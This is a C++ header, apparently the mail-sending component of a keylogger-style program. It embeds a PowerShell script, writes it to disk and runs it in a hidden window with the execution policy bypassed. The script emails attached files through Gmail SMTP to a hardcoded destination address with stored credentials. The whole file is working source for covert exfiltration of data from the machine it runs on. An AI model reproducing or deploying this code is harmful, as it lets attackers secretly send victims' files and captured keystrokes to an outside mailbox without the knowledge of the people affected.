#ifndef POCKET_SENDMAIL_H
#define POCKET_SENDMAIL_H
#define SCRIPT_NAME "sm.ps1"

#include <string>
#include <fstream>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

using namespace std;

namespace Mail {
    // Both emails can be the same
#define X_EM_TO "our.destination@email.address"
#define X_EM_FROM "Address of sender"
#define X_EM_PASS "password"

    const string &PowerShellScript =
            "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
            "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
            " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
            "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
            "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
            "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
            "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
            "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
            "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
            "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
            "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
            "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
            "  ForEach ($val in $Attachments)\r\n                    "
            "        {\r\n               "
            "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
            "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
            "}\r\n                catch\r\n                    {\r\n                        exit 2; "
            "\r\n                    }\r\n            }\r\n "
            "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
            "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
            "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
            "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
            "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "  // exit 7 == success
            "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
            "Send-EMail -attachment $Att "
            "-To \"" +
            string(X_EM_TO) +
            "\""
            " -Body $Body -Subject $Subj "
            "-password \"" +
            string(X_EM_PASS) +
            "\""
            " -From \"" +
            string(X_EM_FROM) +
            "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef X_EM_FROM
    #undef X_EM_TO
    #undef X_EM_PASS

    string stringReplace(string s, const string &target,
                         const string &newStr) { // search for a specific string and replace that string
        if (target.empty())
            return s; // nothing to replace
        size_t sp = 0;

        while ((sp = s.find(target, sp)) != string::npos) // as long as not equal to null terminator position
            s.replace(sp, target.length(), newStr), sp += newStr.length();
        return s;
    }

    bool checkFile(const string &f) {
        ifstream file(f);
        return (bool) file;
    }

    bool createScript() {
        ofstream script(IO::getPath(true) + string(SCRIPT_NAME));
        if (!script) return false;
        script << PowerShellScript;
        if (!script) return false;
        script.close();
        return true;
    }

    Timer m_timer;

    int SendMail(const string &subject, const string &body, const string &attachments) {
        bool ok; // if mail was successfully sent

        ok = IO::mkDir(IO::getPath(true));
        if (!ok) return -1;  // Error: 1
        string scr_path = IO::getPath(true) + string(SCRIPT_NAME);
        if (!checkFile(scr_path)) ok = createScript(); // attempt to create script if not present
        if (!ok) return -2;  // Error: 2

        string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" +
                       // ExecutionPolicy ByPass skips admin requirements
                       stringReplace(subject, "\"", "\\\"") + "\" -Body \"" +
                       // Replaces invalid characters to prevent "injection"
                       stringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments +
                       "\"";  // Replaces invalid characters to prevent "injection"

        SHELLEXECUTEINFO ShExecInfo = {0};  // creates structure
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);  // set structure size
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;  // prevents shell from closing immediately
        ShExecInfo.hwnd = NULL;  // program has no window to act as a parent
        ShExecInfo.lpVerb = "open"; // open the file (same as rightclick --> open)
        ShExecInfo.lpFile = "powershell"; // use powershell to execute file
        ShExecInfo.lpParameters = param.c_str();  // pass parameters we created earlier
        ShExecInfo.lpDirectory = NULL;  // we have no working dir
        ShExecInfo.nShow = SW_HIDE; // hide powershell window
        ShExecInfo.hInstApp = NULL;  // handles instance

        ok = (bool) ShellExecuteEx(&ShExecInfo);
        if (!ok) return -3; // check if was executed successfully & Error: 3

        // Wait to see if mail was successfully sent
        WaitForSingleObject(ShExecInfo.hProcess, 7000);  // delay 7 seconds
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); // check powershell status

        m_timer.setFunc([&]() { // lambda function to access all variables from SendMail function
            WaitForSingleObject(ShExecInfo.hProcess, 60000); // wait for 1 min
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if ((int) exit_code == STILL_ACTIVE) // check powershell status
                TerminateProcess(ShExecInfo.hProcess, 101);
            Helper::writeLog("<From SendMail> Return code: " + Helper::toString((int) exit_code));
        });

        m_timer.setRepeatCnt(1L);  // execute only once
        m_timer.setInterval(10L);
        m_timer.Start(true);  // asynchronous execute

        return (int) exit_code;
    }

    int SendMail(const string &subject, const string &body,
                 const vector<string> &attArr) { // overload for multiple attachments
        string attachments;
        if (attArr.size() == 1U) { // check if only 1 attachment
            attachments = attArr.at(0); // grab the first index only then
        } else {
            for (const auto &v : attArr) attachments += v + "::"; // separate attachments with 2 colons
            attachments = attachments.substr(0, attachments.length() - 2);  // remove last 2 colons
        }

        return SendMail(subject, body, attachments);
    }
}

#endif //POCKET_SENDMAIL_H
